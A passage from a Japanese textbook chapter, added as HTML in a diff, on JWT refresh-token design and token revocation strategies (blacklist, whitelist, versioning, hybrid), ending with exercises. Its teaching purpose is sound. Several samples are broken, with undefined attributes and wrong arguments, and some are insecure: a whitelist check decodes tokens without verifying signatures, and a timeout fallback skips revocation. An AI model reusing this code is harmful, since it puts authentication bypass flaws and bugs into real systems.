+<p>                        else:</p>
+<p>                            # 通常の有効期限</p>
+<p>                            new_expiry = time.time() + self.default_ttl</p>
+                        
+<p>                        # 既存トークンの有効期限を更新</p>
+<p>                        self.update_token_expiry(token, new_expiry)</p>
+                        
+<p>                        # 新しいアクセストークンのみ発行</p>
+<p>                        return {</p>
+<p>                            'access_token': self.issue_access_token(token.user_id),</p>
+<p>                            'refresh_token': token  # 同じリフレッシュトークン</p>
+<p>                        }</p>
+<p>                ''',</p>
+<p>                'pros': 'アクティブユーザーの利便性',</p>
+<p>                'cons': 'トークンの長期化リスク'</p>
+<p>            },</p>
+            
+<p>            'pattern_4_cryptographic_binding': {</p>
+<p>                'description': '暗号的バインディング',</p>
+<p>                'implementation': '''</p>
+<p>                class CryptographicBinding:</p>
+<p>                    def create_bound_tokens(self, user_id):</p>
+<p>                        # 暗号的にバインドされたトークンペア</p>
+<p>                        binding_key = secrets.token_bytes(32)</p>
+                        
+<p>                        # アクセストークンにバインディングハッシュを含める</p>
+<p>                        access_payload = {</p>
+<p>                            'user_id': user_id,</p>
+<p>                            'binding': hashlib.sha256(binding_key).hexdigest(),</p>
+<p>                            'exp': time.time() + 900</p>
+<p>                        }</p>
+                        
+<p>                        # リフレッシュトークンにバインディングキーを含める</p>
+<p>                        refresh_payload = {</p>
+<p>                            'user_id': user_id,</p>
+<p>                            'binding_key': base64.b64encode(binding_key).decode(),</p>
+<p>                            'exp': time.time() + 604800</p>
+<p>                        }</p>
+                        
+<p>                        return {</p>
+<p>                            'access_token': jwt.encode(access_payload, secret),</p>
+<p>                            'refresh_token': jwt.encode(refresh_payload, secret)</p>
+<p>                        }</p>
+                    
+<p>                    def verify_binding(self, access_token, refresh_token):</p>
+<p>                        # トークンペアのバインディングを検証</p>
+<p>                        access_payload = jwt.decode(access_token, secret)</p>
+<p>                        refresh_payload = jwt.decode(refresh_token, secret)</p>
+                        
+<p>                        binding_key = base64.b64decode(refresh_payload['binding_key'])</p>
+<p>                        expected_binding = hashlib.sha256(binding_key).hexdigest()</p>
+                        
+<p>                        return access_payload['binding'] == expected_binding</p>
+<p>                ''',</p>
+<p>                'pros': 'トークンペアの整合性保証',</p>
+<p>                'cons': '実装の複雑性'</p>
+<p>            }</p>
+<p>        }</p>
+<p></code></pre></p><h2>5.4 トークンの無効化戦略 - ステートレスの限界と対処法</h2><h3>5.4.1 JWTの無効化という課題</h3><p><pre><code>python</p>
+<p>class JWTRevocationChallenge:</p>
+<p>    """JWT無効化の課題と解決策"""</p>
+    
+<p>    def explain_revocation_challenge(self):</p>
+<p>        """なぜJWT無効化が難しいのか"""</p>
+        
+<p>        return {</p>
+<p>            'fundamental_issue': {</p>
+<p>                'jwt_nature': 'JWTは自己完結型でステートレス',</p>
+<p>                'problem': '一度発行されたトークンは有効期限まで有効',</p>
+<p>                'scenario': '''</p>
+<p>                # ユーザーがログアウトしても...</p>
+<p>                user_clicks_logout()</p>
+                
+<p>                # トークンはまだ有効！</p>
+<p>                stolen_token = "eyJhbGciOiJIUzI1NiIs..."</p>
+<p>                # 攻撃者はまだAPIにアクセス可能</p>
+                
+<p>                # 有効期限（exp）まで待つしかない？</p>
+<p>                ''',</p>
+<p>                'impact': [</p>
+<p>                    'ログアウト機能の実装困難',</p>
+<p>                    'アカウント停止の即時反映不可',</p>
+<p>                    '漏洩トークンの無効化不可',</p>
+<p>                    'パスワード変更後も古いトークンが有効'</p>
+<p>                ]</p>
+<p>            },</p>
+            
+<p>            'why_this_matters': {</p>
+<p>                'security_requirements': [</p>
+<p>                    'ユーザーは即座にログアウトできるべき',</p>
+<p>                    '不正アクセスは即座に停止できるべき',</p>
+<p>                    'パスワード変更は既存セッションを無効化すべき'</p>
+<p>                ],</p>
+                
+<p>                'compliance_requirements': [</p>
+<p>                    'GDPR: データアクセスの即時停止',</p>
+<p>                    'セキュリティポリシー: セッション管理'</p>
+<p>                ],</p>
+                
+<p>                'user_expectations': [</p>
+<p>                    'ログアウトは即座に効果を持つ',</p>
+<p>                    'デバイス紛失時の対応'</p>
+<p>                ]</p>
+<p>            }</p>
+<p>        }</p>
+<p></code></pre></p><h3>5.4.2 トークン無効化の実装戦略</h3><p><pre><code>python</p>
+<p>import redis</p>
+<p>from typing import Set, Optional</p>
+<p>from datetime import datetime, timedelta</p><p>class TokenRevocationStrategies:</p>
+<p>    """トークン無効化の各種戦略"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.redis_client = redis.Redis()</p>
+<p>        self.strategies = self._setup_strategies()</p>
+    
+<p>    def _setup_strategies(self):</p>
+<p>        """各戦略の実装"""</p>
+        
+<p>        return {</p>
+<p>            'blacklist': self.implement_blacklist_strategy(),</p>
+<p>            'whitelist': self.implement_whitelist_strategy(),</p>
+<p>            'short_expiry': self.implement_short_expiry_strategy(),</p>
+<p>            'versioning': self.implement_version_strategy(),</p>
+<p>            'hybrid': self.implement_hybrid_strategy()</p>
+<p>        }</p>
+    
+<p>    def implement_blacklist_strategy(self):</p>
+<p>        """ブラックリスト戦略の実装"""</p>
+        
+<p>        class BlacklistStrategy:</p>
+<p>            def __init__(self, redis_client):</p>
+<p>                self.redis = redis_client</p>
+<p>                self.blacklist_prefix = "revoked_token:"</p>
+            
+<p>            def revoke_token(self, token: str):</p>
+<p>                """トークンをブラックリストに追加"""</p>
+                
+<p>                try:</p>
+<p>                    # トークンをデコード（検証なし）</p>
+<p>                    payload = jwt.decode(token, options={"verify_signature": False})</p>
+                    
+<p>                    # JTI（JWT ID）を取得</p>
+<p>                    jti = payload.get('jti')</p>
+<p>                    if not jti:</p>
+<p>                        # JTIがない場合はトークン全体のハッシュを使用</p>
+<p>                        jti = hashlib.sha256(token.encode()).hexdigest()</p>
+                    
+<p>                    # 有効期限を取得</p>
+<p>                    exp = payload.get('exp', 0)</p>
+<p>                    ttl = max(exp - int(time.time()), 0)</p>
+                    
+<p>                    # ブラックリストに追加（有効期限まで保持）</p>
+<p>                    if ttl > 0:</p>
+<p>                        self.redis.setex(</p>
+<p>                            f"{self.blacklist_prefix}{jti}",</p>
+<p>                            ttl,</p>
+<p>                            json.dumps({</p>
+<p>                                'revoked_at': time.time(),</p>
+<p>                                'reason': 'user_logout'</p>
+<p>                            })</p>
+<p>                        )</p>
+                        
+<p>                        # 統計情報を更新</p>
+<p>                        self._update_revocation_stats(jti)</p>
+                        
+<p>                    return True</p>
+                    
+<p>                except Exception as e:</p>
+<p>                    logging.error(f"Token revocation failed: {e}")</p>
+<p>                    return False</p>
+            
+<p>            def is_token_revoked(self, token: str) -> bool:</p>
+<p>                """トークンが無効化されているかチェック"""</p>
+                
+<p>                try:</p>
+<p>                    payload = jwt.decode(token, options={"verify_signature": False})</p>
+<p>                    jti = payload.get('jti')</p>
+                    
+<p>                    if not jti:</p>
+<p>                        jti = hashlib.sha256(token.encode()).hexdigest()</p>
+                    
+<p>                    # ブラックリストをチェック</p>
+<p>                    return self.redis.exists(f"{self.blacklist_prefix}{jti}") > 0</p>
+                    
+<p>                except Exception:</p>
+<p>                    # エラーの場合は安全側に倒す（無効とみなす）</p>
+<p>                    return True</p>
+            
+<p>            def revoke_all_user_tokens(self, user_id: str):</p>
+<p>                """ユーザーのすべてのトークンを無効化"""</p>
+                
+<p>                # ユーザーのすべてのアクティブトークンを取得</p>
+<p>                pattern = f"active_token:user:{user_id}:*"</p>
+                
+<p>                for key in self.redis.scan_iter(match=pattern):</p>
+<p>                    token_info = json.loads(self.redis.get(key))</p>
+<p>                    self.revoke_token(token_info['jti'])</p>
+                
+<p>                # ユーザーレベルの無効化フラグも設定</p>
+<p>                self.redis.setex(</p>
+<p>                    f"user_revoked:{user_id}",</p>
+<p>                    86400,  # 24時間</p>
+<p>                    time.time()</p>
+<p>                )</p>
+            
+<p>            def cleanup_expired_entries(self):</p>
+<p>                """期限切れエントリのクリーンアップ"""</p>
+                
+<p>                # Redisの有効期限機能により自動削除されるが、</p>
+<p>                # 統計情報などの追加クリーンアップ</p>
+                
+<p>                cleanup_count = 0</p>
+<p>                for key in self.redis.scan_iter(match=f"{self.blacklist_prefix}*"):</p>
+<p>                    if not self.redis.exists(key):</p>
+<p>                        cleanup_count += 1</p>
+                
+<p>                logging.info(f"Cleaned up {cleanup_count} expired blacklist entries")</p>
+                
+<p>            def get_blacklist_stats(self):</p>
+<p>                """ブラックリストの統計情報"""</p>
+                
+<p>                stats = {</p>
+<p>                    'total_revoked': 0,</p>
+<p>                    'revoked_by_reason': {},</p>
+<p>                    'memory_usage': 0</p>
+<p>                }</p>
+                
+<p>                for key in self.redis.scan_iter(match=f"{self.blacklist_prefix}*"):</p>
+<p>                    stats['total_revoked'] += 1</p>
+                    
+<p>                    data = json.loads(self.redis.get(key) or '{}')</p>
+<p>                    reason = data.get('reason', 'unknown')</p>
+<p>                    stats['revoked_by_reason'][reason] = \</p>
+<p>                        stats['revoked_by_reason'].get(reason, 0) + 1</p>
+                
+<p>                # メモリ使用量の推定</p>
+<p>                stats['memory_usage'] = stats['total_revoked'] * 100  # bytes</p>
+                
+<p>                return stats</p>
+        
+<p>        return BlacklistStrategy(self.redis_client)</p>
+    
+<p>    def implement_whitelist_strategy(self):</p>
+<p>        """ホワイトリスト戦略の実装"""</p>
+        
+<p>        class WhitelistStrategy:</p>
+<p>            def __init__(self, redis_client):</p>
+<p>                self.redis = redis_client</p>
+<p>                self.whitelist_prefix = "valid_token:"</p>
+            
+<p>            def register_token(self, token: str, user_id: str):</p>
+<p>                """トークンをホワイトリストに登録"""</p>
+                
+<p>                payload = jwt.decode(token, options={"verify_signature": False})</p>
+<p>                jti = payload['jti']</p>
+<p>                exp = payload['exp']</p>
+                
+<p>                ttl = max(exp - int(time.time()), 0)</p>
+                
+<p>                self.redis.setex(</p>
+<p>                    f"{self.whitelist_prefix}{jti}",</p>
+<p>                    ttl,</p>
+<p>                    json.dumps({</p>
+<p>                        'user_id': user_id,</p>
+<p>                        'issued_at': time.time(),</p>
+<p>                        'device_id': payload.get('device_id')</p>
+<p>                    })</p>
+<p>                )</p>
+            
+<p>            def is_token_valid(self, token: str) -> bool:</p>
+<p>                """トークンがホワイトリストに存在するかチェック"""</p>
+                
+<p>                try:</p>
+<p>                    payload = jwt.decode(token, options={"verify_signature": False})</p>
+<p>                    jti = payload['jti']</p>
+                    
+<p>                    return self.redis.exists(f"{self.whitelist_prefix}{jti}") > 0</p>
+                    
+<p>                except Exception:</p>
+<p>                    return False</p>
+            
+<p>            def revoke_token(self, token: str):</p>
+<p>                """トークンをホワイトリストから削除"""</p>
+                
+<p>                payload = jwt.decode(token, options={"verify_signature": False})</p>
+<p>                jti = payload['jti']</p>
+                
+<p>                self.redis.delete(f"{self.whitelist_prefix}{jti}")</p>
+            
+<p>            def get_user_active_sessions(self, user_id: str) -> List[Dict]:</p>
+<p>                """ユーザーのアクティブセッション一覧"""</p>
+                
+<p>                sessions = []</p>
+                
+<p>                for key in self.redis.scan_iter(match=f"{self.whitelist_prefix}*"):</p>
+<p>                    data = json.loads(self.redis.get(key))</p>
+                    
+<p>                    if data['user_id'] == user_id:</p>
+<p>                        sessions.append({</p>
+<p>                            'jti': key.replace(self.whitelist_prefix, ''),</p>
+<p>                            'device_id': data.get('device_id'),</p>
+<p>                            'issued_at': data['issued_at']</p>
+<p>                        })</p>
+                
+<p>                return sessions</p>
+        
+<p>        return WhitelistStrategy(self.redis_client)</p>
+    
+<p>    def implement_short_expiry_strategy(self):</p>
+<p>        """短い有効期限戦略"""</p>
+        
+<p>        return {</p>
+<p>            'concept': 'アクセストークンの有効期限を極めて短くする',</p>
+            
+<p>            'implementation': {</p>
+<p>                'access_token_ttl': 300,  # 5分</p>
+<p>                'refresh_interval': 240,  # 4分（期限前にリフレッシュ）</p>
+<p>                'grace_period': 60        # 1分の猶予期間</p>
+<p>            },</p>
+            
+<p>            'pros': [</p>
+<p>                '無効化の必要性が減る',</p>
+<p>                'ステートレスを維持',</p>
+<p>                'シンプルな実装'</p>
+<p>            ],</p>
+            
+<p>            'cons': [</p>
+<p>                '頻繁なトークン更新',</p>
+<p>                'ネットワーク負荷増加',</p>
+<p>                'クライアント実装の複雑化'</p>
+<p>            ],</p>
+            
+<p>            'client_implementation': '''</p>
+<p>            class ShortExpiryTokenManager {</p>
+<p>                constructor() {</p>
+<p>                    this.refreshThreshold = 60; // 1分前にリフレッシュ</p>
+<p>                }</p>
+                
+<p>                async getValidToken() {</p>
+<p>                    const token = this.currentToken;</p>
+                    
+<p>                    if (!token || this.isExpiringSoon(token)) {</p>
+<p>                        await this.refreshToken();</p>
+<p>                    }</p>
+                    
+<p>                    return this.currentToken;</p>
+<p>                }</p>
+                
+<p>                isExpiringSoon(token) {</p>
+<p>                    const payload = this.decodeToken(token);</p>
+<p>                    const expiresIn = payload.exp * 1000 - Date.now();</p>
+                    
+<p>                    return expiresIn < this.refreshThreshold * 1000;</p>
+<p>                }</p>
+<p>            }</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def implement_version_strategy(self):</p>
+<p>        """バージョニング戦略"""</p>
+        
+<p>        class VersioningStrategy:</p>
+<p>            def __init__(self):</p>
+<p>                self.user_token_versions = {}  # user_id -> version</p>
+            
+<p>            def increment_user_version(self, user_id: str):</p>
+<p>                """ユーザーのトークンバージョンを増加"""</p>
+                
+<p>                current_version = self.user_token_versions.get(user_id, 0)</p>
+<p>                new_version = current_version + 1</p>
+                
+<p>                self.user_token_versions[user_id] = new_version</p>
+                
+<p>                # 永続化（Redis等）</p>
+<p>                self.redis.set(f"user_token_version:{user_id}", new_version)</p>
+                
+<p>                return new_version</p>
+            
+<p>            def create_versioned_token(self, user_id: str) -> str:</p>
+<p>                """バージョン付きトークンの作成"""</p>
+                
+<p>                version = self.user_token_versions.get(user_id, 0)</p>
+                
+<p>                payload = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'version': version,</p>
+<p>                    'exp': int(time.time() + 3600)</p>
+<p>                }</p>
+                
+<p>                return jwt.encode(payload, self.secret, algorithm='HS256')</p>
+            
+<p>            def verify_token_version(self, token: str) -> bool:</p>
+<p>                """トークンバージョンの検証"""</p>
+                
+<p>                try:</p>
+<p>                    payload = jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+                    
+<p>                    user_id = payload['user_id']</p>
+<p>                    token_version = payload['version']</p>
+                    
+<p>                    # 現在のバージョンと比較</p>
+<p>                    current_version = self.user_token_versions.get(user_id, 0)</p>
+                    
+<p>                    return token_version >= current_version</p>
+                    
+<p>                except Exception:</p>
+<p>                    return False</p>
+            
+<p>            def revoke_all_tokens(self, user_id: str):</p>
+<p>                """すべてのトークンを無効化（バージョン増加）"""</p>
+                
+<p>                self.increment_user_version(user_id)</p>
+                
+<p>                logging.info(f"All tokens revoked for user {user_id}")</p>
+        
+<p>        return VersioningStrategy()</p>
+    
+<p>    def implement_hybrid_strategy(self):</p>
+<p>        """ハイブリッド戦略"""</p>
+        
+<p>        class HybridRevocationStrategy:</p>
+<p>            """複数の戦略を組み合わせた実装"""</p>
+            
+<p>            def __init__(self):</p>
+<p>                self.blacklist = BlacklistStrategy()</p>
+<p>                self.versioning = VersioningStrategy()</p>
+<p>                self.short_expiry_config = {</p>
+<p>                    'critical_operations': 300,  # 5分</p>
+<p>                    'normal_operations': 900,    # 15分</p>
+<p>                    'read_only': 3600            # 1時間</p>
+<p>                }</p>
+            
+<p>            def issue_token(self, user_id: str, scope: str) -> str:</p>
+<p>                """スコープに応じた有効期限のトークン発行"""</p>
+                
+<p>                # バージョンを含める</p>
+<p>                version = self.versioning.get_user_version(user_id)</p>
+                
+<p>                # スコープに応じた有効期限</p>
+<p>                ttl = self.short_expiry_config.get(scope, 900)</p>
+                
+<p>                payload = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'scope': scope,</p>
+<p>                    'version': version,</p>
+<p>                    'jti': str(uuid.uuid4()),</p>
+<p>                    'exp': int(time.time() + ttl)</p>
+<p>                }</p>
+                
+<p>                return jwt.encode(payload, self.secret, algorithm='HS256')</p>
+            
+<p>            def verify_token(self, token: str) -> bool:</p>
+<p>                """多層検証"""</p>
+                
+<p>                # 1. ブラックリストチェック</p>
+<p>                if self.blacklist.is_token_revoked(token):</p>
+<p>                    return False</p>
+                
+<p>                # 2. バージョンチェック</p>
+<p>                if not self.versioning.verify_token_version(token):</p>
+<p>                    return False</p>
+                
+<p>                # 3. 通常のJWT検証</p>
+<p>                try:</p>
+<p>                    jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+<p>                    return True</p>
+<p>                except:</p>
+<p>                    return False</p>
+            
+<p>            def emergency_revoke_all(self):</p>
+<p>                """緊急時の全トークン無効化"""</p>
+                
+<p>                # 全ユーザーのバージョンを増加</p>
+<p>                for user_id in self.get_all_users():</p>
+<p>                    self.versioning.increment_user_version(user_id)</p>
+                
+<p>                # 追加のセキュリティフラグ</p>
+<p>                self.redis.set("global_token_reset", time.time())</p>
+                
+<p>                logging.critical("Emergency token revocation executed")</p>
+        
+<p>        return HybridRevocationStrategy()</p>
+<p></code></pre></p><h3>5.4.3 実践的な無効化システムの構築</h3><p><pre><code>python</p>
+<p>class PracticalRevocationSystem:</p>
+<p>    """実践的なトークン無効化システム"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.revocation_manager = self._setup_revocation_manager()</p>
+    
+<p>    def _setup_revocation_manager(self):</p>
+<p>        """無効化マネージャーのセットアップ"""</p>
+        
+<p>        class RevocationManager:</p>
+<p>            def __init__(self):</p>
+<p>                self.strategies = {</p>
+<p>                    'immediate': self._immediate_revocation,</p>
+<p>                    'eventual': self._eventual_revocation,</p>
+<p>                    'emergency': self._emergency_revocation</p>
+<p>                }</p>
+<p>                self.events = RevocationEventHandler()</p>
+            
+<p>            def revoke_token(self, token: str, reason: str, </p>
+<p>                           immediate: bool = True) -> bool:</p>
+<p>                """トークンの無効化"""</p>
+                
+<p>                # イベントの記録</p>
+<p>                event = self.events.create_revocation_event(token, reason)</p>
+                
+<p>                if immediate:</p>
+<p>                    result = self._immediate_revocation(token, event)</p>
+<p>                else:</p>
+<p>                    result = self._eventual_revocation(token, event)</p>
+                
+<p>                # 監査ログ</p>
+<p>                self._audit_revocation(token, reason, result)</p>
+                
+<p>                return result</p>
+            
+<p>            def _immediate_revocation(self, token: str, event: Dict) -> bool:</p>
+<p>                """即時無効化"""</p>
+                
+<p>                # ブラックリストに追加</p>
+<p>                self.blacklist.add(token)</p>
+                
+<p>                # キャッシュをクリア</p>
+<p>                self.cache.invalidate_token(token)</p>
+                
+<p>                # 関連サービスに通知</p>
+<p>                self.notify_services(event)</p>
+                
+<p>                return True</p>
+            
+<p>            def _eventual_revocation(self, token: str, event: Dict) -> bool:</p>
+<p>                """最終的無効化（短い有効期限を活用）"""</p>
+                
+<p>                # 次回のトークン更新で無効化</p>
+<p>                self.mark_for_revocation(token)</p>
+                
+<p>                # 有効期限が切れるまでの暫定措置</p>
+<p>                self.apply_restrictions(token)</p>
+                
+<p>                return True</p>
+            
+<p>            def _emergency_revocation(self, pattern: str) -> int:</p>
+<p>                """緊急無効化（パターンマッチング）"""</p>
+                
+<p>                revoked_count = 0</p>
+                
+<p>                # 該当するトークンを検索</p>
+<p>                for token in self.find_tokens_by_pattern(pattern):</p>
+<p>                    if self.revoke_token(token, "emergency"):</p>
+<p>                        revoked_count += 1</p>
+                
+<p>                # システム全体に警告</p>
+<p>                self.broadcast_emergency_alert(pattern, revoked_count)</p>
+                
+<p>                return revoked_count</p>
+            
+<p>            def implement_revocation_events(self):</p>
+<p>                """無効化イベントの実装"""</p>
+                
+<p>                class RevocationEventHandler:</p>
+<p>                    def __init__(self):</p>
+<p>                        self.event_store = []</p>
+<p>                        self.subscribers = []</p>
+                    
+<p>                    def create_revocation_event(self, token: str, reason: str) -> Dict:</p>
+<p>                        """無効化イベントの作成"""</p>
+                        
+<p>                        event = {</p>
+<p>                            'id': str(uuid.uuid4()),</p>
+<p>                            'timestamp': time.time(),</p>
+<p>                            'token_jti': self._extract_jti(token),</p>
+<p>                            'reason': reason,</p>
+<p>                            'metadata': self._extract_metadata(token)</p>
+<p>                        }</p>
+                        
+<p>                        self.event_store.append(event)</p>
+<p>                        self._publish_event(event)</p>
+                        
+<p>                        return event</p>
+                    
+<p>                    def subscribe_to_revocations(self, callback):</p>
+<p>                        """無効化イベントの購読"""</p>
+<p>                        self.subscribers.append(callback)</p>
+                    
+<p>                    def _publish_event(self, event: Dict):</p>
+<p>                        """イベントの配信"""</p>
+<p>                        for subscriber in self.subscribers:</p>
+<p>                            try:</p>
+<p>                                subscriber(event)</p>
+<p>                            except Exception as e:</p>
+<p>                                logging.error(f"Event delivery failed: {e}")</p>
+                
+<p>                return RevocationEventHandler()</p>
+        
+<p>        return RevocationManager()</p>
+    
+<p>    def implement_graceful_degradation(self):</p>
+<p>        """グレースフルデグラデーション"""</p>
+        
+<p>        return {</p>
+<p>            'concept': '無効化システムの障害時の対処',</p>
+            
+<p>            'fallback_strategies': {</p>
+<p>                'redis_unavailable': {</p>
+<p>                    'detection': 'Redis connection timeout',</p>
+<p>                    'fallback': 'Use short token expiry only',</p>
+<p>                    'alert': 'Critical - Revocation system degraded'</p>
+<p>                },</p>
+                
+<p>                'high_latency': {</p>
+<p>                    'detection': 'Revocation check > 50ms',</p>
+<p>                    'fallback': 'Async revocation checks',</p>
+<p>                    'monitoring': 'Track degraded mode metrics'</p>
+<p>                },</p>
+                
+<p>                'memory_pressure': {</p>
+<p>                    'detection': 'Blacklist size > threshold',</p>
+<p>                    'action': 'Aggressive cleanup of expired entries',</p>
+<p>                    'fallback': 'LRU eviction policy'</p>
+<p>                }</p>
+<p>            },</p>
+            
+<p>            'implementation': '''</p>
+<p>            async def check_token_with_fallback(token: str) -> bool:</p>
+<p>                try:</p>
+<p>                    # プライマリチェック（タイムアウト付き）</p>
+<p>                    return await asyncio.wait_for(</p>
+<p>                        self.check_revocation(token),</p>
+<p>                        timeout=0.05  # 50ms</p>
+<p>                    )</p>
+<p>                except asyncio.TimeoutError:</p>
+<p>                    # フォールバック：基本的なJWT検証のみ</p>
+<p>                    metrics.increment('revocation.check.timeout')</p>
+                    
+<p>                    try:</p>
+<p>                        jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+<p>                        return True</p>
+<p>                    except:</p>
+<p>                        return False</p>
+<p>                except Exception as e:</p>
+<p>                    # エラー時は安全側に倒す</p>
+<p>                    logging.error(f"Revocation check failed: {e}")</p>
+<p>                    return False</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>まとめ</h2><p>この章では、トークンベース認証の基礎として以下を学びました：</p><p>1. <strong>JWTの構造と仕組み</strong></p>
+<p>   - なぜJWTが広く採用されているのか</p>
+<p>   - ステートレス認証の利点</p>
+<p>   - 署名アルゴリズムの選択</p><p>2. <strong>トークンの保存と管理</strong></p>
+<p>   - 各保存場所のセキュリティ特性</p>
+<p>   - XSSとCSRF攻撃への対策</p>
+<p>   - クライアント側の実装パターン</p><p>3. <strong>リフレッシュトークンの設計</strong></p>
+<p>   - セキュリティとUXのバランス</p>
+<p>   - トークンローテーション</p>
+<p>   - デバイスバインディング</p><p>4. <strong>トークンの無効化戦略</strong></p>
+<p>   - ステートレスの限界への対処</p>
+<p>   - 各種無効化パターン</p>
+<p>   - 実践的なシステム構築</p><p>次章では、これらの基礎の上に、OAuth 2.0プロトコルについて詳しく学んでいきます。</p><h2>演習問題</h2><h3>問題1：JWT実装</h3>
+<p>以下の要件を満たすJWT認証システムを実装しなさい：</p>
+<p>- RS256アルゴリズムを使用</p>
+<p>- アクセストークン（15分）とリフレッシュトークン（7日）</p>
+<p>- トークンローテーション機能</p>
+<p>- 適切なエラーハンドリング</p><h3>問題2：トークン保存戦略</h3>
+<p>SPAアプリケーションにおける最適なトークン保存戦略を設計しなさい：</p>
+<p>- XSS対策</p>
+<p>- CSRF対策</p>
+<p>- ユーザビリティの考慮</p>
+<p>- 実装の詳細</p><h3>問題3：無効化システムの設計</h3>
+<p>1000万ユーザー規模のサービスでトークン無効化システムを設計しなさい：</p>
+<p>- パフォーマンス要件（レイテンシ < 10ms）</p>
+<p>- スケーラビリティ</p>
+<p>- 障害時の動作</p>
+<p>- コスト最適化</p><h3>問題4：セキュリティ監査</h3>
+<p>既存のJWT実装のセキュリティ監査を行い、以下を報告しなさい：</p>
+<p>- 脆弱性の特定</p>
+<p>- リスク評価</p>
+<p>- 改善提案</p>
+<p>- 実装優先度</p><h3>問題5：マイグレーション計画</h3>
+<p>セッションベース認証からJWT認証への移行計画を作成しなさい：</p>
+<p>- 段階的移行戦略</p>
+<p>- 後方互換性の維持</p>
+<p>- ロールバック手順</p>
+<p>- 性能影響の評価</p><h3>チャレンジ問題：分散環境でのトークン管理</h3>
+<p>マイクロサービス環境でのトークン管理システムを設計しなさい：</p>
+<p>- サービス間認証</p>
+<p>- トークンの伝播</p>
+<p>- 一貫性のある無効化</p>
+<p>- 監視とトラブルシューティング</p>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
